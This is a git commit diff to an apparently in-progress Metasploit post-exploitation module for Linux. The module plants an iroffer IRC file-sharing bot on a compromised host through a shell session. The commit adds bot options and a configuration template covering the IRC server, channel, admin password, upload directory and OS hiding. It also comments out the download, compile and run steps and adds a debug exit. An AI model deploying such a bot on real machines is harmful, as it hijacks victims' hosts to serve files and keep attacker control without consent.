25836cc9c9f96199011ee34808bb872e6e63b591
doug <dougtko@gmail.com>
2013-02-28 12:58:34 -0500

    ...

--- modules/post/linux/irc/iroffer.rb
+++ modules/post/linux/irc/iroffer.rb
@@ -26,23 +26,82 @@ class Metasploit3 < Msf::Post
                 'Platform'      => [ 'linux' ],
                 'SessionTypes'  => [ 'shell' ]
             ))
+        register_options(
+            [ 
+                OptString.new('FILEDIR', [ true,  "directory from where to serve files", '/tmp']),
+                OptString.new('UPLOADDIR', [ false,  "path to upload files", '/tmp']),
+                OptString.new('BOTNICK', [ false, "nickname for bot", "XDCCbot"]),
+                OptString.new('SERVER', [ true, "IRC server", ""]),
+                OptString.new('PORT', [ true, "server port", "6667"]),
+                OptString.new('CONNECTIONMETHOD', [ true, "how to connect", "direct"]),
+                OptString.new('CHANNEL', [ true, "channel", ""]),
+                OptString.new('ADMINPASS', [ true, "encrypted admin password", ""]),
+                OptString.new('ADMINHOST', [ true, "hostmask for admin", ""])
+            ], self.class
+        )
+    end
+
+    def setup_config
+        config =<<EOF
+statefile #{datastore['BOTNICK']}.state
+connectionmethod #{datastore['CONNECTIONMETHOD']}
+network abjects.net
+{
+    server #{datastore['SERVER']} #{datastore['PORT']}
+    channel #{datastore['CHANNEL']} -plist 14 -pformat full
+}
+user_nick #{datastore['BOTNICK']}
+user_realname Owner: OwnerNick mailto:user@example.com
+user_modes +i
+owner_nick OwnerNick mailto:user@example.com
+loginname fakelogin
+#upnp_router
+slotsmax 20
+queuesize 10
+maxtransfersperperson 1
+maxqueueditemsperperson 1
+idlequeuesize 100
+maxidlequeuedperperson 20
+balanced_queue
+filedir #{datastore['FILEDIR']}
+noduplicatefiles
+removelostfiles
+autoaddann added
+autoadd_dir #{datastore['FILEDIR']}
+restrictlist
+restrictprivlist
+restrictsend
+atfind 3
+downloadhost *!*@*
+adminpass #{datastore['ADMINPASS']}
+adminhost #{datastore['ADMINHOST']}
+uploadhost #{datastore['UPLOADHOST']}
+uploaddir #{datastore['FILEDIR']}
+hideos
+nomd5sum
+EOF
+        config
     end
 
     def run
         distro = get_sysinfo
         h = get_host
         print_status("Running module against #{h}")
+        print_status("Setting up config file")
+        config = setup_config
+        print_status(config)
+        exit
         #print_status("Info:")
         #print_status("\t#{distro[:version]}")
         #print_status("\t#{distro[:kernel]}")
         #print_status("PWD:\t#{pwd}")
-        print_status("Setting PATH")
-        cmd_exec("export PATH=/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin")
-        download_files
-        unzip_files
-        cd("iroffer-dinoex")
-        compile_source
-        run_bot
+        #print_status("Setting PATH")
+        #cmd_exec("export PATH=/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin")
+        #download_files
+        #unzip_files
+        #cd("iroffer-dinoex")
+        #compile_source
+        #run_bot
     end
 
     def get_host
